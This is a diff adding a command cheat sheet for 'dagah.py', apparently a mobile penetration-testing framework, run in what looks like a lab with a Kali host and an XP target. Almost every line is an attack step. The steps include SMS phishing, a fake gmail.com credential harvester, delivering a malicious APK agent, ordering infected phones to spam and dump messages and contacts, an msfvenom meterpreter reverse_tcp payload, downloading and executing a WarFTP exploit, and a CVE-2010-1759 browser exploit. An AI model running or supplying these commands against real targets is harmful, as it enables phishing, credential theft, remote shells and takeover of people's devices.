@@ -1,0 +1,44 @@
+python dagah.py -Stop all
+
+python dagah.py -Modem app -u saintdemo -k KEYKEY1 -n 15555215554
+
+
+python dagah.py -Phish basic -u saintbasic2 -N numbers.txt -l saintbasic
+
+
+python dagah.py -Phish harvester -u saintgmail2 -n 15555215556 -c www.gmail.com -l saintwharvester
+
+
+python dagah.py -Phish autoagent -u saintagent2 -N numbers.txt -a /root/Desktop/abcnews.apk
+
+python dagah.py -Agent list
+
+python dagah.py -Report get
+
+python dagah.py -Report drop
+
+python dagah.py -Agent command -n 15555215556 -c SPAM -p target:15555215558,message:"hiya georgia"
+
+python dagah.py -Agent command -c SMSS -n 15555215556
+
+python dagah.py -Agent command -c CONT -n 15555215556
+
+python dagah.py -Agent data
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.163 -f c -b '\x00\x40\x0a\x0d'
+
+(compile for ARM SPF can do it. Functionality not in Dagah yet)
+
+python dagah.py -Agent command -n 15555215556 -c DOWN -p file:/root/dagah/exploits/Windows/warftpmeterpreter
+
+python dagah.py -Agent command -n 15555215556 -c EXEC -p downloaded:yes,syntax:"warftpmeterpreter 192.168.1.164 21"
+
+python dagah.py -Agent command -n 15555215556 -c NMAP -p targets:192.168.1.164
+
+192.168.1.163 <- Kali
+192.168.1.164<- XP
+
+python dagah.py -Client list
+
+python dagah.py -Client CVE-2010-1759 -n 15555215558 -u keywtest -f bang.html
+
